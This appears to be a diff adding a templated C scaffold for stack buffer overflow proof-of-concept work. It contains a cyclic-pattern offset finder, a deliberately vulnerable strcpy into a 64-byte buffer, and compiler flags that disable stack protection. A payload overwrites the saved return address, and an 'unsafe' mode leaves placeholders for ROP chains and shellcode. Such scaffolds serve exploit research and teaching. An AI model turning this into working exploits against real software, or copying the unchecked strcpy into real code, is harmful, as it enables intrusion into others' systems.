@@ -1,0 +1,69 @@
+/*
+ * Stack buffer overflow PoC scaffold — {{arch}}
+ * vuln: {{vuln}}
+ *
+ * Build:
+ *   {{#if asan}}cc -g -O0 -fno-stack-protector -fsanitize=address -o poc poc.c{{else}}cc -g -O0 -fno-stack-protector -z execstack -no-pie -o poc poc.c{{/if}}
+ *
+ * Workflow:
+ *   1. Find the offset to the saved return address (de Bruijn pattern below).
+ *   2. Confirm the crash and the controlled value in $pc / RIP.
+ *   3. {{#if unsafe}}Fill the ROP chain / shellcode sections.{{else}}Stop at controlled RIP — pass --unsafe to extend this into a full exploit.{{/if}}
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+/* ── de Bruijn / cyclic pattern for offset discovery ─────────────────────── */
+static void cyclic(char *out, size_t n) {
+    const char *set = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    size_t s = strlen(set), i = 0;
+    for (size_t a = 0; a < s && i < n; a++)
+      for (size_t b = 0; b < s && i < n; b++)
+        for (size_t c = 0; c < s && i < n; c++)
+          for (size_t d = 0; d < s && i < n; d++) {
+              if (i + 4 > n) return;
+              out[i++] = set[a]; out[i++] = set[b];
+              out[i++] = set[c]; out[i++] = set[d];
+          }
+}
+
+/* TODO: replace with the real vulnerable sink. */
+static void vulnerable(const char *input) {
+    char buf[64];
+    strcpy(buf, input);   /* overflow: input may exceed sizeof(buf) */
+    printf("buf=%s\n", buf);
+}
+
+int main(int argc, char **argv) {
+    /* OFFSET_TODO: set once known (find with the cyclic pattern + crash $pc). */
+    size_t offset = 72;
+
+    size_t payload_len = offset + 8;
+    char *payload = calloc(1, payload_len + 1);
+
+    if (argc > 1 && strcmp(argv[1], "--cyclic") == 0) {
+        cyclic(payload, payload_len);
+        fwrite(payload, 1, payload_len, stdout);
+        return 0;
+    }
+
+    memset(payload, 'A', offset);
+{{#if unsafe}}
+    /* ── controlled return address ──────────────────────────────────────── */
+    uint64_t ret = 0x4141414141414141ULL; /* RET_ADDR_TODO: gadget / shellcode */
+    memcpy(payload + offset, &ret, 8);
+
+    /* ROP_CHAIN_TODO: append gadgets here once you have a leak to defeat ASLR.
+     * SHELLCODE_TODO: or place a stub if the stack is executable (rare today). */
+{{else}}
+    /* Fill the saved return address with a marker to confirm control of RIP.
+     * Pass --unsafe to turn this into a ROP/shellcode-bearing exploit. */
+    memset(payload + offset, 'B', 8);
+{{/if}}
+
+    vulnerable(payload);
+    free(payload);
+    return 0;
+}
